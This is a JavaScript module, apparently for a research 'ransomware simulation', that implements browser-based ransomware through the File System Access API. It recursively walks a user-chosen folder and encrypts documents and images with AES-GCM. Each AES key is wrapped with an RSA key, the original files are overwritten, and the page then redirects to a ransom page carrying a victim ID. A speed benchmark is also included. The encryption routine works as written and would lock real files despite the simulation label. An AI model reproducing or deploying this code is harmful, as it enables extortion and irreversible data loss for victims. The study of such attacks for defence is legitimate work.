/**
 * FSA Module
 * Handles the File System Access API loop for the Ransomware simulation.
 */
class FSAModule {
    static targetExtensions = ['.docx', '.xlsx', '.pdf', '.txt', '.jpeg', '.png'];

    /**
     * Appends a log message to the terminal UI.
     */
    static log(message, type = 'info') {
        const logEl = document.getElementById('actionLog');
        if (!logEl) return;
        const entry = document.createElement('div');
        entry.className = `log-entry log-${type}`;
        entry.textContent = `[${new Date().toISOString().split('T')[1].slice(0,-1)}] ${message}`;
        logEl.appendChild(entry);
        logEl.scrollTop = logEl.scrollHeight;
    }

    /**
     * Main ransomware loop: Recursively scans and encrypts the directory.
     */
    static async startEncryptionAttack() {
        try {
            const dirHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
            this.log(`Attack initiated on directory: ${dirHandle.name}`, 'warning');
            
            // Generate Key pair for backend simulation
            await RSAModule.generateBackendKeyPair();
            this.log("Backend RSA-2048 keypair generated.");

            // Start recursive encryption
            await this.processDirectory(dirHandle);

            this.log("Encryption phase complete. Redirecting to ransom note...", 'danger');
            
            // Redirect to extortion page
            setTimeout(() => {
                window.location.href = 'ransom.html?victimId=' + Date.now();
            }, 3000);

        } catch (error) {
            this.log(`Attack aborted or failed: ${error.message}`, 'error');
        }
    }

    /**
     * Recursively processes a directory handle.
     */
    static async processDirectory(dirHandle) {
        for await (const entry of dirHandle.values()) {
            if (entry.kind === 'file') {
                await this.processFile(entry);
            } else if (entry.kind === 'directory') {
                await this.processDirectory(entry);
            }
        }
    }

    /**
     * Encrypts a single file handle if it matches target extensions.
     */
    static async processFile(fileHandle) {
        const file = await fileHandle.getFile();
        const ext = file.name.substring(file.name.lastIndexOf('.')).toLowerCase();

        if (!this.targetExtensions.includes(ext)) {
            return; // Skip non-target files
        }

        this.log(`Encrypting: ${file.name} (${(file.size / 1024).toFixed(2)} KB)`);

        try {
            // Read file content
            const arrayBuffer = await file.arrayBuffer();
            const fileContent = new Uint8Array(arrayBuffer);

            // 1. Generate AES Key
            const aesKey = AESModule.generateAESKey();

            // 2. Encrypt File Content (Wasm AES-GCM)
            const encryptedData = await AESModule.encryptFile(fileContent, aesKey);

            // 3. Encrypt AES Key with RSA-2048 (Backend Key)
            const wrappedKey = await RSAModule.wrapAESKey(aesKey);

            // 4. Clear sensitive AES key from memory
            MemoryModule.clear_memory(aesKey);

            // 5. Overwrite the file with encrypted data
            // Format: [WrappedKeyLength (4 bytes)] + [WrappedKey] + [IV (12 bytes)] + [Ciphertext || Tag]
            const keyLenBytes = new Uint8Array(new Uint32Array([wrappedKey.length]).buffer);
            
            const finalPayload = new Uint8Array(keyLenBytes.length + wrappedKey.length + encryptedData.iv.length + encryptedData.ciphertext.length);
            
            let offset = 0;
            finalPayload.set(keyLenBytes, offset); offset += keyLenBytes.length;
            finalPayload.set(wrappedKey, offset); offset += wrappedKey.length;
            finalPayload.set(encryptedData.iv, offset); offset += encryptedData.iv.length;
            finalPayload.set(encryptedData.ciphertext, offset);

            // Write back to the file system
            const writable = await fileHandle.createWritable();
            await writable.write(finalPayload);
            await writable.close();

            this.log(`✓ Success: ${file.name} is now locked.`, 'success');
            
            // Also clear final payload from memory as good practice
            MemoryModule.clear_memory(finalPayload);

        } catch (e) {
            this.log(`Failed to encrypt ${file.name}: ${e.message}`, 'error');
        }
    }

    /**
     * Runs the speed benchmark to match the paper's investigation
     * (1MB, 10MB, 100MB encryption speed).
     */
    static async runBenchmark() {
        this.log("Starting Wasm Encryption Benchmark...", "warning");
        const sizes = [
            { name: "1MB", bytes: 1024 * 1024 },
            { name: "10MB", bytes: 10 * 1024 * 1024 },
            { name: "100MB", bytes: 100 * 1024 * 1024 }
        ];

        // Ensure Wasm is loaded
        await AESModule.loadWasm();

        for (const size of sizes) {
            // Generate dummy buffer
            const dummyData = new Uint8Array(size.bytes);
            window.crypto.getRandomValues(dummyData); // Fill with random data
            const aesKey = AESModule.generateAESKey();

            this.log(`Benchmarking ${size.name}...`);
            
            const start = performance.now();
            await AESModule.encryptFile(dummyData, aesKey);
            const end = performance.now();
            
            const timeMs = end - start;
            const speedMBps = (size.bytes / (1024 * 1024)) / (timeMs / 1000);
            
            this.log(`[Result] ${size.name}: Speed = ${speedMBps.toFixed(2)} MB/s (Time: ${timeMs.toFixed(0)}ms)`, "success");

            // Clean up
            MemoryModule.clear_memory(aesKey);
            MemoryModule.clear_memory(dummyData);
        }
        
        this.log("Benchmark Complete.", "info");
    }
}

window.FSAModule = FSAModule;
